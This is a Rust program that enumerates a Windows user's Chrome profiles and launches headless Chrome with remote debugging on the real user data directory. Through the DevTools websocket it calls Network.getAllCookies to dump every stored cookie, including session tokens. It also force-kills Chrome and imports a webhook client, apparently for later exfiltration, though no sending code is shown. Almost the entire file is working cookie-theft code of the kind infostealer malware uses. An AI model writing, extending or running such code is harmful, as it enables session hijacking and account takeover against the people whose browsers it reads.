use std::fmt::format;
use std::process::{Command, Stdio};
use std::{env, fs};
//use decrypt_cookies::{browser::info::ChromiumInfo, Browser, ChromiumBuilder};
use dirs::home_dir;
use dotenv::dotenv;
use futures_util::{SinkExt, StreamExt};
use serde_json::json;
use serde_json::Value;
use terminal_size::{terminal_size, Height, Width};
use tokio_tungstenite::{connect_async, tungstenite};
use url::Url;
use web_sys;
use webhook::client::WebhookClient;

// const OS: &str = env::consts::OS;
const DEBUG_PORT: u32 = 9222;
const CHROME_PATH: &str = r#"C:\Program Files\Google\Chrome\Application\chrome.exe"#; // Update with your Chrome path
const USER_DATA_DIR: &str = r#"\google\chrome\User Data"#;

#[tokio::main]
pub async fn main() -> Result<(), reqwest::Error> {
    dotenv().ok();
    //kill_chrome();
    let localappdata = env::var("LOCALAPPDATA").unwrap();
    let user_data_dir = localappdata.clone() + USER_DATA_DIR;
    let local_state = fs::read_to_string(format!("{user_data_dir}\\Local State")).unwrap();
    let v: Value = serde_json::from_str(&local_state).unwrap();
    let profiles_raw = v["profile"]["info_cache"].clone();
    for (profile, _) in profiles_raw.as_object().unwrap() {
        start_debugged_chrome(localappdata.clone() + USER_DATA_DIR + &format!("\\{profile}"));
        let url = get_debug_ws_url().await;

        dbg!("{}", &url);
        let url = Url::parse(&url).expect("Failed to parse WebSocket URL");
        let (ws_stream, _) = connect_async(url).await.unwrap();
        println!("Connected to WebSocket!");
        let (mut sink, mut stream) = ws_stream.split();
        let _ = sink.send(tungstenite::Message::text(
            json!({
                "id": 1,
                "method": "Network.enable"
            })
            .to_string(),
        ))
        .await
        .expect("Failed to enable Network");
        // let _ = sink.send(tungstenite::Message::text(
        //     json!({
        //     "id": 2,
        //     "method": "Page.navigate",
        //         "params": {
        //         "url": "https://lviscampuscare.org"
        //     }
        //     })
        //     .to_string(),
        // )).await.expect("Failed to navigate");
        // stream.next();

        // if let Some(response) = stream.next().await {
        //     match response {
        // Ok(msg) => println!("Received from Navigation : {:?}", msg),
        //         Err(e) => eprintln!("Error receiving message: {:?}", e),
        //     }
        // }
        let _ = sink.send(tungstenite::Message::text(
            json!({
                "id": 3,
                "method": "Network.getAllCookies"
            })
            .to_string(),
        ))
        .await
        .expect("ln 52");

        if let Some(response) = stream.next().await {
            match response {
                Ok(msg) => println!("Received: {:?}", msg),
                Err(e) => eprintln!("Error receiving message: {:?}", e),
            }
        }
       // kill_chrome();
    }

    //   start_debugged_chrome();
    //   let url = get_debug_ws_url().await;
    //
    //   dbg!("{}", &url);
    //   let url = Url::parse(&url).expect("Failed to parse WebSocket URL");
    //   let (ws_stream, _) = connect_async(url).await.unwrap();
    //   println!("Connected to WebSocket!");
    //   let (mut sink, mut stream) = ws_stream.split();
    //   sink.send(tungstenite::Message::text(
    //       json!({
    //           "id": 1,
    //           "method": "Network.enable"
    //       })
    //       .to_string(),
    //   ))
    //   .await
    //   .expect("Failed to enable Network");
    //   sink.send(tungstenite::Message::text(
    //       json!({
    //           "id": 1,
    //           "method": "Network.getAllCookies"
    //       })
    //       .to_string(),
    //   ))
    //   .await
    //   .expect("ln 52");
    //   if let Some(response) = stream.next().await {
    //       match response {
    //           Ok(msg) => println!("Received: {:?}", msg),
    //           Err(e) => eprintln!("Error receiving message: {:?}", e),
    //       }
    //   }
    //   kill_chrome();
    Ok(())
}

async fn get_debug_ws_url() -> String {
    let body = reqwest::get(format!("http://localhost:{DEBUG_PORT}/json"))
        .await
        .unwrap()
        .text()
        .await
        .unwrap();
    dbg!("\n\n{:#?}\n", &body);
    let json_res: Value = serde_json::from_str(&body).unwrap();
    let websocket_debugger_url = json_res[0]["webSocketDebuggerUrl"].to_string();
    println!("{}", websocket_debugger_url);
    websocket_debugger_url[1..websocket_debugger_url.len() - 1].to_owned()
}

fn kill_chrome() {
    let output = Command::new("taskkill")
        .args(&["/F", "/IM", "chrome.exe"])
        .output()
        .expect("Failed to execute command");

    if !output.status.success() {
        eprintln!("Failed to kill Chrome: {:?}", output.status);
    }
}

fn start_debugged_chrome(user_data_dir: String) {
    let localappdata = env::var("LOCALAPPDATA").unwrap();
    let mut child = Command::new(CHROME_PATH)
        .args(&[
            &format!("--remote-debugging-port={}", DEBUG_PORT),
            "--remote-allow-origins=*",
            "--headless",
            &format!("--user-data-dir={}", localappdata + USER_DATA_DIR),
        ])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .expect("Failed to start Chrome");

    println!("Chrome started with PID: {}", child.id());
}
